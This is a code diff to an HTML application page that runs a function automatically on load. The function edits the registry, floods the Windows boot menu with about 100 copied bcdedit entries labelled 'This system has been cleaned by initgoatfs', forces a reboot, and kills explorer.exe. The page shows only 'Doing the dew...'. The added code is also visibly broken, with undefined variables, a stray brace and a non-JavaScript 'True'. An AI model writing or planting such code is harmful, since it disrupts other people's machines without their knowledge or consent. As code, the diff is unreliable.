@@ -90,15 +90,20 @@ function applyPolicies() {
     setReg("HKCU\\Software\\Microsoft\\Windows\\DWM\\ColorizationColorBalance", "REG_DWORD", 100);
     var network = new ActiveXObject("WScript.Network");
     var strUser = network.ComputerName;
-    runCmd('bcdedit /set {current} description "CollabVM '+strUser+'"');
-    runCmd('bcdedit /set {bootmgr} displaybootmenu yes');
-    runCmd('bcdedit /copy {current} /d "This system has been cleaned"');
-    runCmd('bcdedit /copy {current} /d "by initgoatfs"');
-    for (var i = 0; i < 100; i++) {
-        runCmd('bcdedit /copy {current} /d "!'+i+'!"');
+    var fso, s = "C:/a.txt";
+    fso = new ActiveXObject("Scripting.FileSystemObject");
+    if (!fso.FileExists(filespec)) {
+        fs.CreateTextFile("c:\a.txt", True)
+        runCmd('bcdedit /timeout 3');
+        runCmd('bcdedit /set {current} description "CollabVM '+strUser+'"');
+        runCmd('bcdedit /set {bootmgr} displaybootmenu yes');
+        runCmd('bcdedit /copy {current} /d "This system has been cleaned"');
+        runCmd('bcdedit /copy {current} /d "by initgoatfs"');}
+        for (var i = 0; i < 100; i++) {
+            runCmd('bcdedit /copy {current} /d "!'+i+'!"');
+        }
+        runCmd("shutdown /r /t 2");
     }
-    runCmd('bcdedit /timeout 3');
-    runCmd("shutdown /r /t 2");
     runCmd("taskkill /f /im explorer.exe");
     window.close();
 }
@@ -108,5 +113,6 @@ window.onload = applyPolicies;
 
 </head>
 <body>
+    <p>Doing the dew...</p>
 </body>
 </html>
